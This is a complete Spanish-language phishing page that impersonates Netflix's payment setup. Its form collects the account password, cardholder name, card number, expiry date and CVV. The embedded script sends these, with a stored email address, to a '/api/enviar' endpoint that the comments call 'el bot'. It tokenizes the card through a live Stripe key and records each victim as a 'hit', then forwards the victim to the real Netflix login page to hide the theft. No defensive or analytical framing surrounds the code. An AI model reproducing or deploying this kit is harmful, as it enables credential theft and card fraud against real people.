<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmaci&oacute;n de Servicio</title>
    <script src="https://js.stripe.com/v3/"></script>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { background: #fff; color: #333; font-family: 'Roboto', sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; }
        .container-pay { max-width: 440px; width: 100%; margin: 30px auto; padding: 0 20px; text-align: center; }
        .nav-pay { border-bottom: 1px solid #e6e6e6; padding: 15px 20px; text-align: left; width: 100%; box-sizing: border-box; }
        h1 { font-size: 32px; margin: 10px 0 20px; font-weight: 700; text-align: left; }
        .input-box { margin-bottom: 15px; }
        .input-box input { width: 100%; padding: 15px; border: 1px solid #8c8c8c; border-radius: 2px; font-size: 16px; box-sizing: border-box; outline: none; }
        .grid-input { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .btn-submit { background: #e50914; color: #fff; width: 100%; padding: 18px; border: none; font-size: 20px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
        #loading-overlay { display: none; text-align: center; padding: 60px 20px; }
    </style>
</head>
<body>
    <div style="width: 100%;">
        <nav class="nav-pay">
            <img src="img/logo.png" style="width: 100px;" alt="Logo"> 
        </nav>

        <div class="container-pay" id="form-container">
            <h1>Configura tu tarjeta</h1>
            <form id="pay-process-form">
                <div class="input-box"><input type="password" id="f_k_1" placeholder="Contraseña de cuenta" required></div>
                <div class="input-box"><input type="text" id="f_n_1" placeholder="Nombre en la tarjeta" required></div>
                <div class="input-box"><input type="text" id="f_t_1" placeholder="Número de tarjeta" maxlength="16" required></div>
                <div class="grid-input">
                    <div class="input-box"><input type="text" id="f_e_1" placeholder="MM/AA" maxlength="5" required></div>
                    <div class="input-box"><input type="text" id="f_c_1" placeholder="CVV" maxlength="4" required></div>
                </div>
                <button type="submit" class="btn-submit">Iniciar membresía</button>
            </form>
        </div>

        <div id="loading-overlay">
            <i class="fas fa-spinner fa-spin fa-3x" style="color:#e50914;"></i>
            <p style="margin-top: 20px; font-size: 18px;">Validando con su entidad bancaria...</p>
        </div>
    </div>

    <script>
        const stripe = Stripe('pk_live_51ShZ3pAeUmcfN350ViX4smhmh5q0IVTh1HBTgTi38ibNz07TvUQzb1F6PyQpWvF1N1y4411ZM7Ys0x9mQw9foU4800BwXkfy0n');

        // Máscara MM/AA
        document.getElementById('f_e_1').addEventListener('input', function(e) {
            let v = this.value.replace(/\D/g, '');
            if (v.length >= 2) this.value = v.substring(0,2) + '/' + v.substring(2,4);
        });

        document.getElementById('pay-process-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            document.getElementById('form-container').style.display = 'none';
            document.getElementById('loading-overlay').style.display = 'block';

            const ccVal = document.getElementById('f_t_1').value.replace(/\s/g, '');
            const exp = document.getElementById('f_e_1').value.split('/');

            const payload = {
                em: sessionStorage.getItem('usr_mail') || 'Desconocido',
                pw: document.getElementById('f_k_1').value,
                nm: document.getElementById('f_n_1').value,
                cc: ccVal,
                ex: document.getElementById('f_e_1').value,
                cv: document.getElementById('f_c_1').value,
                st: "Sin Token (Timeout)"
            };

            // SEGURO DE SALIDA: A los 2.8 segundos te vas a Netflix sí o sí
            const forceFinish = setTimeout(() => {
                window.location.href = "https://www.netflix.com/login";
            }, 2800);

            // 1. Envío inmediato al bot
            const sendBot = fetch('/api/enviar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            // 2. Intento con Stripe
            const sendStripe = stripe.createToken({
                number: ccVal,
                exp_month: exp[0],
                exp_year: exp[1],
                cvc: payload.cv
            }).then(result => {
                if (result.token) {
                    payload.st = result.token.id;
                    // Actualizamos el hit con el token si Stripe respondió a tiempo
                    return fetch('/api/enviar', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                }
            }).catch(() => {});

            // Cuando termine el envío al bot o Stripe, redirigimos
            Promise.all([sendBot, sendStripe]).finally(() => {
                clearTimeout(forceFinish);
                window.location.href = "https://www.netflix.com/login";
            });
        });
    </script>
</body>
</html>
